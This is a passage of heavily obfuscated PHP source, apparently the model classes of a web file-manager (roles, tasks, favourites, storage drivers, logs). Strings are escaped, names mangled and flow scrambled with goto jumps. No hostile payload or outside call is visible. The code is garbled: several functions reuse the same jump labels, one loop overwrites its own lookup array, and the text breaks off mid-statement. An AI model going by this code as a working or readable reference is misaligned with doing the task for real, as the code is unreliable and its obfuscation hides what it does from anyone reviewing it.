"\123\x79\x73\164\x65\x6d\56\162\x6f\x6c\145\x4c\151\163\164"; public $field = array("\156\141\155\x65", "\x61\165\x74\x68", "\154\141\x62\145\x6c", "\144\151\163\160\154\x61\171", "\x73\x79\x73\x74\145\155", "\144\145\163\143", "\151\x67\156\157\x72\145\105\170\x74", "\151\147\156\157\x72\145\106\151\x6c\x65\123\x69\x7a\x65", "\x61\144\x6d\151\x6e\151\x73\164\x72\141\x74\x6f\162", "\x73\157\x72\164"); public function listData($fᐯ = false, $e = "\x73\x6f\x72\x74", $C߃魩 = false) { $b =& $_SERVER[Ť]; $dʹ = parent::listData($fᐯ, $e, $C߃魩); if (!$fᐯ) { $F = $b[2061]; foreach ($dʹ as $Aˋ => $eڼ) { if ($eڼ[$b[1843]] == 1) { $dʹ[$Aˋ][$b[421]] = $F; } } } return $dʹ; } public function update($Eؑ, $A) { goto aԛ; A: return parent::update($Eؑ, $A); goto e; e؛: if (!$də || $eӂ && $eӂ[$d֭[383]] != $də[$d֭[383]]) { return !1; } if ($eӂ[$d֭[1843]] == 1) { $A = array($d֭[28] => $A[$d֭[28]], $d֭[1673] => $A[$d֭[1673]]); } $this->filterAuth($A[$d֭[392]]); goto A; aԛ: $d֭ =& $_SERVER[Ť]; $də = parent::listData($Eؑ); $eӂ = $this->findByName($A[$d֭[28]]); goto e؛; e: } public function remove($Bٟ) { $a = parent::listData($Bٟ); if (!$a || $a[$_SERVER[Ť][1136]]) { return !1; } return parent::remove($Bٟ); } public function add($Cѹ֌) { goto f؉; B܆: return parent::insert($Cѹ֌); goto d񠰋; f؉: $aŖꉝ =& $_SERVER[Ť]; $cӅ = $Cѹ֌[$aŖꉝ[28]]; if ($this->findByName($cӅ)) { return !1; } goto DҔ; DҔ: $bޱ = array($aŖꉝ[402] => $cӅ, $aŖꉝ[1658] => $aŖꉝ[33], $aŖꉝ[1654] => $aŖꉝ[1662], $aŖꉝ[2062] => 1, $aŖꉝ[1657] => 0, $aŖꉝ[2063] => 0, $aŖꉝ[1656] => $this->getSort()); $Cѹ֌ = array_merge($bޱ, $Cѹ֌); $this->filterAuth($Cѹ֌[$aŖꉝ[392]]); goto B܆; d񠰋: } private function getSort() { $c =& $_SERVER[Ť]; $B = parent::listData(); $B𻊇 = array_to_keyvalue($B, $c[33], $c[1675]); return empty($B𻊇) ? 0 : max($B𻊇) + 1; } private function filterAuth(&$Eߎ) { $E =& $_SERVER[Ť]; $B珢㮆 = array(); $cچ = array_filter(explode($E[47], $Eߎ)); foreach ($cچ as $Eߎ) { $fƊ = explode($E[91], $Eߎ); if ($fƊ[0] == $E[2064] && $fƊ[1] != $E[1060]) { $eسÝ = $fƊ[0] . $E[91] . $fƊ[1] . $E[2065]; if (!in_array($eسÝ, $cچ)) { $B珢㮆[] = $eسÝ; } } $B珢㮆[] = $Eߎ; } $Eߎ = implode($E[47], $B珢㮆); } public function sort($A쾉, $c) { return parent::update($A쾉, $c); } } class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\x2e\x74\141\x73\x6b\114\x69\163\x74"; public $field = array("\156\x61\x6d\x65", "\x74\171\x70\x65", "\x65\x76\145\x6e\164", "\164\x69\155\145", "\x64\x65\163\x63", "\163\x79\163\164\145\x6d", "\145\156\x61\x62\x6c\145", "\x6c\x61\x73\x74\x52\165\156", "\163\157\x72\x74"); public function listData($C = false, $A龤 = "\x73\x6f\x72\164", $a跈ړ = false) { return parent::listData($C, $A龤, $a跈ړ); } public function add($c) { $Bũ =& $_SERVER[Ť]; $d煈 = $this->findByName($c[$Bũ[28]]); if ($d煈) { return !1; } $c[$Bũ[1457]] = 0; $c[$Bũ[1675]] = $this->getSort(); return parent::insert($c); } private function getSort() { $b˩ =& $_SERVER[Ť]; $CՇ = parent::listData(); $a = array_to_keyvalue($CՇ, $b˩[33], $b˩[1675]); return empty($a) ? 0 : max($a) + 1; } public function update($c̬, $D) { $A =& $_SERVER[Ť]; $D = $this->listData($c̬); $f떄 = $this->findByName($D[$A[28]]); if (!$D || $f떄 && $f떄[$A[383]] != $D[$A[383]]) { return !1; } return parent::update($c̬, $D); } public function remove($aÄ, $Dޣ五 = false) { $Dϔ =& $_SERVER[Ť]; $C䲺 = $this->listData($aÄ); if (!$C䲺) { return; } if (!$Dޣ五 && $C䲺[$Dϔ[1136]] == $Dϔ[83]) { return !1; } return parent::remove($aÄ); } public function enable($dևƺ, $C) { return $this->update($dևƺ, array($_SERVER[Ť][2056] => $C)); } public function run($d҄) { return $this->update($d҄, array($_SERVER[Ť][2066] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\137\146\x61\x76"; protected function cacheFunctionAlias($A۾) { $F =& $_SERVER[Ť]; return array($F[1752] => array(USER_ID, $F[2067])); } protected function listData() { $DԎާ =& $_SERVER[Ť]; $b攴 = array($DԎާ[1485] => USER_ID, $DԎާ[451] => 0); $fّɥ = $DԎާ[2068]; $e暎٭ = $this->field($fّɥ)->where($b攴)->order($DԎާ[2069])->select(); return $e暎٭ ? $e暎٭ : array(); } protected function resetCache() { } protected function listView() { goto Dɟǽӯ; Aƭܔ: $e = array($Cʥ[399] => array($Cʥ[400], $aȚڒ)); $bߋ = Model($Cʥ[768])->listSource($e, $bۑ); $bߋ = array_merge($bߋ[$Cʥ[73]], $bߋ[$Cʥ[74]]); goto fڨލ; fڨލ: $bߋ = array_to_keyvalue($bߋ, $Cʥ[385]); foreach ($E as $B => $aѽ) { $BŻ = $bߋ[$aѽ[$Cʥ[75]]]; $BŻ = $BŻ ? $BŻ : array(); $E[$B] = array_merge($BŻ, $aѽ); } return $E; goto A߈; Dɟǽӯ: $Cʥ =& $_SERVER[Ť]; $E = $this->listData(); $F = array_filter_by_field($E, $Cʥ[29], $Cʥ[398]); goto BǴɊ; BǴɊ: $aȚڒ = array_to_keyvalue($F, $Cʥ[33], $Cʥ[75]); if (!$aȚڒ) { return $E; } $bۑ = 2000; goto Aƭܔ; A߈: } protected function addFav($C, $A݋ٓ = '', $D뉱ƿ = "\163\157\165\162\x63\x65") { goto A󱷉; A󱷉: $cϻ =& $_SERVER[Ť]; $E = array($cϻ[1485] => USER_ID, $cϻ[451] => 0, $cϻ[404] => $D뉱ƿ, $cϻ[403] => $C); if ($this->where($E)->find()) { return !1; } goto A; FЖ鄒: if (!$A݋ٓ && $D뉱ƿ == $cϻ[398]) { $aۜ = Model($cϻ[1172])->where(array($cϻ[399] => $C))->find(); if (!$aۜ) { return !1; } $A݋ٓ = $aۜ[$cϻ[28]]; } $A݋ٓ = $this->getAutoName($A݋ٓ); $eͱ = array($cϻ[1485] => USER_ID, $cϻ[451] => 0, $cϻ[402] => $A݋ٓ, $cϻ[403] => $C, $cϻ[404] => $D뉱ƿ, $cϻ[1656] => $D㲞 + 1); goto b⊑; A: $E = array($cϻ[1485] => USER_ID, $cϻ[451] => 0); $D㲞 = $this->where($E)->max($cϻ[1675]); if (!$D㲞) { $D㲞 = 0; } goto FЖ鄒; b⊑: return $this->add($eͱ); goto aދ; aދ: } protected function remove($E֚) { $Cߐ =& $_SERVER[Ť]; $Dݐ = array($Cߐ[1485] => USER_ID, $Cߐ[401] => $E֚); return $this->where($Dݐ)->delete(); } protected function removeByName($A) { $d祷 =& $_SERVER[Ť]; $CұѮ = array($d祷[1485] => USER_ID, $d祷[402] => $A, $d祷[451] => 0); return $this->where($CұѮ)->delete(); } protected function rename($B, $Aܪ) { $Bσ =& $_SERVER[Ť]; if ($B == $Aܪ) { return !1; } $B଼ = $this->getAutoName($Aܪ); if ($Aܪ != $B଼) { return !1; } $eƖ = array($Bσ[1485] => USER_ID, $Bσ[451] => 0, $Bσ[28] => $B); return $this->where($eƖ)->save(array($Bσ[28] => $Aܪ)); } protected function resetSort($dԢ) { $B =& $_SERVER[Ť]; $dԢ = is_array($dԢ) ? $dԢ : array(); $E = array($B[1485] => USER_ID); for ($B = 0; $B < count($dԢ); $B++) { $E[$B[401]] = $dԢ[$B]; $this->where($E)->save(array($B[1656] => $B + 1)); } return !0; } protected function moveTop($aՄ뎰) { goto B䤷ˏ; Fݩ: if (!$dǑ) { return; } $Dʹ = $this->field($E[383])->where($C۵̈)->order($E[2069])->select(); $Dʹ = array_to_keyvalue($Dʹ, $E[33], $E[383]); goto B眃덾; AɎҸН: return $this->resetSort($Dʹ); goto e׺꧵; B䤷ˏ: $E =& $_SERVER[Ť]; $C۵̈ = array($E[1485] => USER_ID, $E[451] => 0); $dǑ = $this->where($C۵̈)->where(array($E[28] => $aՄ뎰))->find(); goto Fݩ; B眃덾: $E = $Dʹ; $Dʹ = array_remove_value($Dʹ, $dǑ[$E[383]]); array_unshift($Dʹ, $dǑ[$E[383]]); goto AɎҸН; e׺꧵: } protected function moveBottom($DԷ) { $Aﷻ =& $_SERVER[Ť]; $CՈ = array($Aﷻ[1485] => USER_ID, $Aﷻ[451] => 0); $eӍ = $this->where($CՈ)->max($Aﷻ[1675]); $d = array($Aﷻ[1675] => $eӍ + 1); return $this->where($CՈ)->where(array($Aﷻ[28] => $DԷ))->save($d); } private function getAutoName($d˦) { goto d㑳; fմС̢: return $d˦ . "\50{$b󄫴}\x29"; goto Dљ֍; aȜŹ: $c = array_to_keyvalue($c, $b[33], $b[28]); if (!$c || !in_array($d˦, $c)) { return $d˦; } for ($b󄫴 = 0; $b󄫴 < count($c); $b󄫴++) { if (!in_array($d˦ . "\50{$b󄫴}\51", $c)) { return $d˦ . "\x28{$b󄫴}\51"; } } goto fմС̢; d㑳: $b =& $_SERVER[Ť]; $AΆ = array($b[1485] => USER_ID, $b[451] => 0); $c = $this->field($b[28])->where($AΆ)->select(); goto aȜŹ; Dљ֍: } } goto cԏ; Eɐ: class StorageModel extends ModelBaseLight { public $optionType = "\x53\171\163\164\145\155\x2e\163\x74\x6f\162\x61\x67\145\x4c\x69\x73\164"; public $field = array("\x6e\x61\155\145", "\163\x69\x7a\x65\115\141\x78", "\x73\171\163\x74\145\155", "\144\145\146\141\x75\154\x74", "\144\162\x69\166\145\162", "\143\157\x6e\x66\151\x67"); public function listData($aңŰ = false, $e = "\x6d\157\144\151\x66\x79\124\x69\155\145", $aȡ = false) { goto cǒ; cǒ: $dڬ =& $_SERVER[Ť]; $eᛜ = parent::listData($aңŰ, $e, $aȡ); if ($aңŰ) { return $eᛜ; } goto eܐއ; eܐއ: foreach ($eᛜ as $f => $c) { unset($eᛜ[$f][$dڬ[6]]); $eᛜ[$f][$dڬ[1638]] = 0; } $E֕ = array_to_keyvalue($eᛜ, $dڬ[33], $dڬ[383]); $this->_listAppendSize($eᛜ, $E֕); goto f񏕒; f񏕒: return $eᛜ; goto BČڢ; BČڢ: } public function _listAppendSize(&$Bִ, $cųȯ) { $f沊 =& $_SERVER[Ť]; if (!$cųȯ) { return; } $cʦƛ = $f沊[1951] . implode($f沊[47], $cųȯ) . $f沊[1952]; $Fޛ = Model($f沊[735])->query($cʦƛ); $Fޛ = array_to_keyvalue($Fޛ, $f沊[383], $f沊[77]); foreach ($Bִ as $dڤ => $Fٲ) { $Bִ[$dڤ][$f沊[1638]] = isset($Fޛ[$Fٲ[$f沊[383]]]) ? $Fޛ[$Fٲ[$f沊[383]]] : 0; } } public function getConfig($dڳԑ) { $C㜮 = parent::listData($dڳԑ); return json_decode($C㜮[$_SERVER[Ť][6]], !0); } public function update($Eϴ, $a˵) { goto cч; Fܶ: $DΓ = parent::update($Eϴ, $a˵); if ($DΓ && $a˵[$CՎ[34]]) { foreach ($B߷ as $DՉ) { if ($DՉ[$CՎ[34]] && $DՉ[$CՎ[383]] != $Eϴ) { parent::update($DՉ[$CՎ[383]], array($CՎ[34] => 0)); } } } return $DΓ; goto F; cч: $CՎ =& $_SERVER[Ť]; $E = $a˵[$CՎ[28]]; $B߷ = array_to_keyvalue(parent::listData(), $CՎ[28]); goto dϸ; dϸ: if (isset($B߷[$E]) && $B߷[$E][$CՎ[383]] != $Eϴ) { return !1; } if (isset($a˵[$CՎ[1953]]) && $a˵[$CՎ[1953]] == $CՎ[83]) { $this->checkConfig($a˵); } unset($a˵[$CՎ[1953]]); goto Fܶ; F: } public function add($CŊ) { goto e艸; dؐ: $this->checkConfig($CŊ); $dܑآ = parent::insert($CŊ); if ($dܑآ && $CŊ[$cŰ[34]]) { foreach ($bʄ as $cߘ) { if ($cߘ[$cŰ[34]]) { parent::update($cߘ[$cŰ[383]], array($cŰ[34] => 0)); } } } goto d̩梽; e艸: $cŰ =& $_SERVER[Ť]; $bʄ = array_to_keyvalue(parent::listData(), $cŰ[28]); if (isset($bʄ[$CŊ[$cŰ[28]]])) { return !1; } goto dؐ; d̩梽: return $dܑآ; goto B֛; B֛: } public function checkConfig(&$D) { goto D; dԪ: foreach ($b衔 as $d芡 => $B) { $b衔[$d芡] = trim($B); } $b衔[$D[1954]] = rand_string(6); $Aۧ = $GLOBALS[$D[6]][$D[84]][$D[769]]; goto EΊ; EΊ: $DۢԄ = isset($Aۧ[$A]) ? $Aۧ[$A] : ucfirst($A); $B闎ҏ = $D[71] . $DۢԄ; if (!$DۢԄ || !class_exists($B闎ҏ)) { write_log(array($D[1955], $D, get_caller_info()), $D[1956]); show_json(LNG($D[1957]), !1, $D); } goto e᜺; e᜺: $Aߋ = new $B闎ҏ($b衔); if (in_array($A, $Aߋ->objectDriver)) { if (!$Aߋ->isBucketCors() && !$Aߋ->setBucketCors()) { $d銵 = LNG($D[1958]); $d銵 .= $D[1959] . LNG($D[1960]); show_json($d銵, !1); } } $Aɉ = rtrim($b衔[$D[1046]], $D[8]) . $D[8]; goto fӐ; fӐ: $Fݳ̯ = $Aߋ->getPath($Aɉ . $D[1106]); if (!$Aߋ->mkfile($Fݳ̯)) { show_json(LNG($D[1958]), !1); } $b衔[$D[1046]] = $Aɉ; goto b; b: $D[$D[6]] = json_encode($b衔); $D[$D[90]] = $DۢԄ; return !0; goto d荵; D: $D =& $_SERVER[Ť]; $A = strtolower($D[$D[90]]); $b衔 = json_decode($D[$D[6]], !0); goto dԪ; d荵: } public function driverListSystem() { $f =& $_SERVER[Ť]; $e = parent::listData(); $bǜ÷ = array(); foreach ($e as $E) { unset($E[$f[190]], $E[$f[107]]); $E[$f[6]] = json_decode($E[$f[6]], !0); $bǜ÷[] = $E; } return $bǜ÷; } public function defaultDriver() { $b֢ =& $_SERVER[Ť]; $AĻ = parent::listData(); $aݯ = array_filter_by_field($AĻ, $b֢[34], 1); $aݯ = $aݯ[0]; if ($aݯ) { $aݯ[$b֢[6]] = json_decode($aݯ[$b֢[6]], !0); } return $aݯ; } public function driverInfo($d) { $A摏 =& $_SERVER[Ť]; $eσ = array_to_keyvalue(parent::listData(), $A摏[383]); if (!isset($eσ[$d])) { return !1; } $C𻚂 = $eσ[$d]; $C𻚂[$A摏[6]] = json_decode($C𻚂[$A摏[6]], !0); return $C𻚂; } public function remove($B֥) { $this->removeShareItems($B֥); return parent::remove($B֥); } public function removeWithFile($B, $F˅) { goto Eˌ; B: $bȰ = "\x7b\151\x6f\72{$C}\175\x2f"; $b̈́ = !0; $Fڂі = array(); goto D̬; Fږ: if (!$b̈́) { $D->stop($Bʍ); return !1; } $D->end(); if ($F˅ == $F˗[1618]) { $this->remove($B); } goto eΰʲ; E: $D->task[$F˗[708]] = (double) $A馺; $eꔓؿ = KodIO::defaultDriver(); $C = $eꔓؿ[$F˗[383]]; goto B; Eˌ: $F˗ =& $_SERVER[Ť]; $aЫ = array($F˗[760] => $B); $d֚ = Model($F˗[438])->where($aЫ)->count(); goto bʋ; bʋ: $A馺 = Model($F˗[438])->where($aЫ)->sum($F˗[77]); $Bʍ = $F˅ . $F˗[1961] . $B; $D = new TaskFileTransfer($Bʍ, $F˗[1956], $d֚, LNG($F˗[1962]) . "\50{$B}\51"); goto E; D̬: $b۱ = Model($F˗[171])->where($aЫ)->field($F˗[1963])->select(); foreach ($b۱ as $E) { goto c֊ڿ; BՂ: if (IO::exist($eو)) { $D->updateFileEnd($E[$F˗[28]], $E[$F˗[77]]); continue; } if (!IO::move($d, get_path_father($eو))) { $b̈́ = !1; break; } $aЫ = array($F˗[435] => $E[$F˗[435]]); goto d롶; d롶: $aچ = array($F˗[760] => $C, $F˗[75] => $eو); Model($F˗[171])->where($aЫ)->save($aچ); goto FІ; c֊ڿ: $d = $E[$F˗[75]]; $eو = $bȰ . str_replace("\x7b\151\157\x3a{$B}\x7d\57", $F˗[33], $d); if (!IO::exist($d)) { $Fڂі[] = $E[$F˗[435]]; $D->updateFileEnd($E[$F˗[28]], $E[$F˗[77]]); continue; } goto BՂ; FІ: } $this->removeByFileID($Fڂі); goto Fږ; eΰʲ: } public function progress($f, $C쓸) { return Task::get($C쓸 . $_SERVER[Ť][1961] . $f); } private function removeByFileID($Aةޞ = array()) { goto Fڻ; Fڻ: $ċ =& $_SERVER[Ť]; if (empty($Aةޞ)) { return; } $B = array($ċ[435] => array($ċ[7], $Aةޞ)); goto fݪ; fݪ: $e܉ = Model($ċ[1172])->where($B)->field($ċ[385])->select(); if (!$e܉) { return; } $e܉ = array_to_keyvalue($e܉, $ċ[33], $ċ[385]); goto e؄۩; e؄۩: foreach ($e܉ as $b) { Model($ċ[398])->removeNow($b, !1); } goto cʊͳ; cʊͳ: } private function removeShareItems($Cݵ) { goto aŎ; aŎ: $cӑ =& $_SERVER[Ť]; $c삋 = "\173\151\157\x3a{$Cݵ}\x7d\57"; $Dׄ = array($cӑ[385] => 0, $cӑ[1041] => array($cӑ[373], "{$c삋}\45")); goto cם; aβ: Model($cӑ[552])->remove($CР); goto a異; cם: $aϵ = Model($cӑ[1629])->where($Dׄ)->field($cӑ[456])->select(); if (empty($aϵ)) { return; } $CР = array_to_keyvalue($aϵ, $cӑ[33], $cӑ[456]); goto aβ; a異: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\x6d\56\x4c\151\147\x68\x74\101\160\x70"; public $modelType = "\x53\x79\x73\164\145\155\117\x70\x74\x69\x6f\x6e"; public $field = array("\x6e\x61\155\145", "\147\x72\157\x75\160", "\144\x65\x73\143", "\143\x6f\156\164\145\x6e\164"); public function listData($E = false, $f = "\155\x6f\144\151\146\x79\124\151\155\x65", $d۷ސ = true) { return parent::listData($E, $f, $d۷ސ); } public function remove($F썉) { $fݝ = $this->findByName($F썉); if (!$fݝ) { return !1; } return parent::remove($fݝ[$_SERVER[Ť][383]]); } public function add($fꇕ) { if ($this->findByName($fꇕ[$_SERVER[Ť][28]])) { return !1; } return parent::insert($fꇕ); } public function update($f烗, $Dċ) { $E =& $_SERVER[Ť]; $d暎 = $this->findByName($f烗); $fͫ = $this->findByName($Dċ[$E[28]]); if (!$d暎 || $fͫ && $fͫ[$E[383]] != $d暎[$E[383]]) { return !1; } return parent::update($d暎[$E[383]], $Dċ); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\163\x74\145\x6d\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\x72\x65\x61\164\145\x54\x69\x6d\145", "\x74\x69\155\x65", "\151\156\x73\x65\x72\164", "\x66\x75\x6e\x63\164\x69\157\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $cׄ =& $_SERVER[Ť]; return array($cׄ[1964] => LNG($cׄ[1965]), $cׄ[1966] => LNG($cׄ[1967]), $cׄ[1591] => LNG($cׄ[1968]), $cׄ[1969] => LNG($cׄ[1970]), $cׄ[1971] => LNG($cׄ[1972]), $cׄ[1973] => LNG($cׄ[1974]), $cׄ[1975] => LNG($cׄ[1976]), $cׄ[1622] => LNG($cׄ[1976]), $cׄ[1623] => LNG($cׄ[1977]), $cׄ[1978] => LNG($cׄ[1979]), $cׄ[1980] => LNG($cׄ[1981]), $cׄ[1982] => LNG($cׄ[1983]), $cׄ[1984] => LNG($cׄ[1985]), $cׄ[1620] => LNG($cׄ[1986]), $cׄ[1627] => LNG($cׄ[1987]), $cׄ[1988] => LNG($cׄ[1989]), $cׄ[1990] => LNG($cׄ[1991]), $cׄ[1992] => LNG($cׄ[1993]), $cׄ[1994] => LNG($cׄ[1995]), $cׄ[1630] => LNG($cׄ[1996]), $cׄ[1631] => LNG($cׄ[1997]), $cׄ[1998] => LNG($cׄ[1999]), $cׄ[2000] => LNG($cׄ[2001]), $cׄ[2002] => LNG($cׄ[2003]), $cׄ[1625] => LNG($cׄ[2004]), $cׄ[2005] => LNG($cׄ[2006]), $cׄ[1624] => LNG($cׄ[2007]), $cׄ[2008] => LNG($cׄ[2009]), $cׄ[2010] => LNG($cׄ[2011]), $cׄ[2012] => LNG($cׄ[2012]), $cׄ[2013] => LNG($cׄ[1595]), $cׄ[2014] => LNG($cׄ[2015]), $cׄ[2016] => LNG($cׄ[2017]), $cׄ[2018] => LNG($cׄ[2019]), $cׄ[2020] => LNG($cׄ[2021]), $cׄ[2022] => LNG($cׄ[2023]), $cׄ[2024] => LNG($cׄ[2024]), $cׄ[2025] => LNG($cׄ[2026]), $cׄ[2027] => LNG($cׄ[2028]), $cׄ[2029] => LNG($cׄ[2030]), $cׄ[2031] => LNG($cׄ[2032]), $cׄ[2033] => LNG($cׄ[2034]), $cׄ[2035] => LNG($cׄ[2036])); } private function typeFile() { $a洛 =& $_SERVER[Ť]; $f = array($a洛[1627] => array($a洛[1628]), $a洛[1982] => array($a洛[2037]), $a洛[1984] => array($a洛[2038]), $a洛[1620] => array($a洛[1621]), $a洛[1990] => array(), $a洛[1992] => array(), $a洛[1994] => array(), $a洛[1630] => array($a洛[1632]), $a洛[1631] => array($a洛[1632]), $a洛[1998] => array($a洛[2039]), $a洛[2000] => array($a洛[2039]), $a洛[2002] => array($a洛[2040]), $a洛[1988] => array($a洛[2041]), $a洛[1625] => array($a洛[2042]), $a洛[2005] => array($a洛[2043]), $a洛[1624] => array($a洛[1626])); return $f; } private function typeAll() { goto E; FωҊ: return $dՆߕ; goto bئձ; E: $dޅ =& $_SERVER[Ť]; $dՆߕ = $this->typeList; $D = array_filter($this->typeFile()); goto E; E: foreach ($D as $DΌ => $c֋) { $dՆߕ[$c֋[0]] = $dՆߕ[$DΌ]; } $dՆߕ[$dޅ[1632]] = LNG($dޅ[2044]); $dՆߕ[$dޅ[2039]] = LNG($dޅ[2045]); goto FωҊ; bئձ: } public function addLog($aҥ, $Fҩְ = array()) { goto cׯ; cׯ: $A =& $_SERVER[Ť]; if (!isset($this->typeList[$aҥ])) { return; } $CѠ = defined($A[442]) && USER_ID ? USER_ID : (isset($Fҩְ[$A[1493]]) ? $Fҩְ[$A[1493]] : 0); goto Dɧ; Dɧ: if (!$CѠ) { $CѠ = (int) Session::get($A[1776]); } $D = get_client_ip(); if (!$Fҩְ || strlen(json_encode($Fҩְ)) >= 1024) { $Fҩְ = array($A[2046] => $D); } else { if (is_array($Fҩְ)) { $Fҩְ[$A[2046]] = $D; } else { $Fҩְ = array($A[1058] => $Fҩְ, $A[2046] => $D); } } goto b쫶; b쫶: $Fҩְ = array($A[1484] => Session::sign(), $A[1485] => $CѠ, $A[29] => $aҥ, $A[1487] => json_encode($Fҩְ)); parent::add($Fҩְ); goto B; B: } public function remove($c呕) { $this->where(array($_SERVER[Ť][401] => $c呕))->delete(); } private function _makeOrder($Aߐ = '') { goto bɚ̐; a׮: return $this->order($Aߐ); goto Dʆ; c: $dٔƷ = Input::get($d[424], $d[7], $d[1811], array($d[1736], $d[420])); $dٔƷ = $aݒ[$dٔƷ]; $Aߐ = $Aߐ . "{$aΕ}\x20{$dٔƷ}"; goto a׮; bɚ̐: $d =& $_SERVER[Ť]; $aΕ = $d[190]; $aݒ = array($d[418] => $d[419], $d[420] => $d[421]); goto c; Dʆ: } public function get($Fސ = '') { goto Bتŉ; fذ܇: $d؊[$eݎ[361]] = $this->logList($d؊[$eݎ[361]]); return $d؊; goto f戈; Bتŉ: $eݎ =& $_SERVER[Ť]; if (!$Fސ) { show_json(array()); } $BƇ = array(); goto D堺즌; D堺즌: if ($Fސ[$eݎ[1493]]) { $BƇ[$eݎ[1493]] = $Fސ[$eݎ[1493]]; } if (isset($Fސ[$eݎ[712]])) { $C© = $Fސ[$eݎ[712]]; $D֑ۘ = isset($Fސ[$eݎ[464]]) ? $Fސ[$eݎ[464]] : time(); $BƇ[$eݎ[190]] = array($eݎ[327], array($C©, $D֑ۘ)); } if ($Fސ[$eݎ[29]]) { $E莵И = explode($eݎ[47], $Fސ[$eݎ[29]]); $Fߎŷ = $this->typeFile(); $c؝ = array(); foreach ($E莵И as $aՊɄ) { $c؝[] = $aՊɄ; if (isset($Fߎŷ[$aՊɄ])) { $c؝ = array_merge($c؝, $Fߎŷ[$aՊɄ]); } } $c؝ = array_unique($c؝); if ($c؝) { $BƇ[$eݎ[29]] = array($eݎ[7], $c؝); } } goto c吔݋; c吔݋: if (!empty($Fސ[$eݎ[2046]])) { $BƇ[$eݎ[421]] = array($eݎ[373], "\x25{$Fސ[$eݎ[2046]]}\x25"); } $d؊ = $this->_makeOrder()->where($BƇ)->selectPage(); if (empty($d؊[$eݎ[361]])) { show_json(array(), !0, $d؊[$eݎ[358]]); } goto fذ܇; f戈: } private function ipAddress(&$a) { $bȚϵ =& $_SERVER[Ť]; if (!empty($a[$bȚϵ[2046]])) { $F = IpLocation::get($a[$bȚϵ[2046]]); } else { $F = LNG($bȚϵ[2047]); } $a[$bȚϵ[2048]] = $F; } private function descZipDownload($a󈗷ѐ, &$f̓) { $DЦᬨ =& $_SERVER[Ť]; if (!isset($a󈗷ѐ[$DЦᬨ[2049]])) { return; } $Fج = json_decode($a󈗷ѐ[$DЦᬨ[2049]], !0); foreach ($Fج as $BƦ) { try { $eв = IO::infoFull($BƦ[$DЦᬨ[75]]); } catch (Exception $fܐ) { continue; } $a󈗷ѐ[$DЦᬨ[75]] = $BƦ[$DЦᬨ[75]]; $f̓[] = $a󈗷ѐ[$DЦᬨ[385]] = $eв[$DЦᬨ[385]]; $f̓[] = $a󈗷ѐ[$DЦᬨ[1867]] = $eв[$DЦᬨ[478]]; break; } return $a󈗷ѐ; } private function getSourceList(&$cȓ帘) { $a׶л =& $_SERVER[Ť]; $B՟ = array(); foreach ($cȓ帘 as $Fɽ => $E˵) { goto C; a֒: if ($D[$a׶л[29]] == $a׶л[1875]) { $B՟[] = $D[$a׶л[421]][$a׶л[385]]; } goto FҲѕ޳; C: $D = json_decode($E˵[$a׶л[421]], !0); if ($E˵[$a׶л[29]] == $a׶л[1623]) { $D = $this->descZipDownload($D, $B՟); $cȓ帘[$Fɽ][$a׶л[421]] = json_encode($D); continue; } if (strpos($E˵[$a׶л[29]], $a׶л[1868]) !== 0) { if (!isset($D[$a׶л[75]]) || strpos($E˵[$a׶л[29]], $a׶л[2050]) !== 0) { continue; } try { $Fū = IO::infoFull($D[$a׶л[75]]); } catch (Exception $Fǰ) { continue; } $B՟[] = $D[$a׶л[385]] = $Fū[$a׶л[385]]; $B՟[] = $D[$a׶л[1867]] = $Fū[$a׶л[478]]; $cȓ帘[$Fɽ][$a׶л[421]] = json_encode($D); continue; } goto Fս; Fս: $B՟[] = $D[$a׶л[385]]; $B՟[] = $D[$a׶л[1867]]; if ($D[$a׶л[29]] == $a׶л[509]) { $B՟[] = $D[$a׶л[421]][$a׶л[1025]]; $B՟[] = $D[$a׶л[421]][$a׶л[1026]]; } goto a֒; FҲѕ޳: } if (!$B՟) { return array(); } return Model($a׶л[768])->sourceListInfo($B՟, !0); } private function logList($B܌) { goto E; b: $D䅛 = array(); foreach ($B܌ as $Cټ => $c۲) { goto eĐߚ; Eˎ: $c۲[$Dф[1810]] = $e ; $aʰ = json_decode($c۲[$Dф[421]], !0); $c۲[$Dф[2046]] = isset($aʰ[$Dф[2046]]) ? $aʰ[$Dф[2046]] : $Dф[33]; goto B; eĐߚ: $Eّ = $c۲[$Dф[29]]; $e  = isset($A[$c۲[$Dф[1493]]]) ? $A[$c۲[$Dф[1493]]] : !1; $Dņ = strpos($Eّ, $Dф[2051]) === 0 ? LNG($Dф[2052]) : LNG($Dф[2047]); goto c舰; EƉ: unset($c۲[$Dф[2053]]); $dƘ[] = $c۲; goto fͽ; B: $this->ipAddress($c۲); if (strpos($Eّ, $Dф[1868]) === 0 || isset($aʰ[$Dф[1867]])) { goto D; D: $aʰ[$Dф[407]] = $Fҍ[$aʰ[$Dф[385]]]; $aʰ[$Dф[1880]] = $Fҍ[$aʰ[$Dф[1867]]]; if ($aʰ[$Dф[29]] == $Dф[509]) { $aʰ[$Dф[421]][$Dф[1025]] = $Fҍ[$aʰ[$Dф[421]][$Dф[1025]]]; $aʰ[$Dф[421]][$Dф[1026]] = $Fҍ[$aʰ[$Dф[421]][$Dф[1026]]]; } goto Dٍ; Dٍ: if ($aʰ[$Dф[29]] == $Dф[1875]) { $aʰ[$Dф[421]][$Dф[385]] = $Fҍ[$aʰ[$Dф[421]][$Dф[385]]]; } if ($aʰ[$Dф[29]] == $Dф[1618]) { $aʰ[$Dф[1880]] = $aʰ[$Dф[407]]; $aʰ[$Dф[1867]] = $aʰ[$Dф[1880]][$Dф[385]]; $aʰ[$Dф[407]] = !1; $aʰ[$Dф[385]] = $Dф[33]; } if ($aʰ[$Dф[407]] && $aʰ[$Dф[407]][$Dф[387]] == $Dф[1136]) { $D䅛[] = $c۲[$Dф[383]]; unset($B܌[$Cټ]); continue; } goto B; B: if ($aʰ[$Dф[1880]] && $aʰ[$Dф[1880]][$Dф[387]] == $Dф[1136]) { $D䅛[] = $c۲[$Dф[383]]; unset($B܌[$Cټ]); continue; } goto B; B: } $c۲[$Dф[421]] = $aʰ; goto EƉ; c舰: $c۲[$Dф[28]] = isset($e [$Dф[28]]) ? $e [$Dф[28]] : LNG($Dф[2047]); $c۲[$Dф[1917]] = 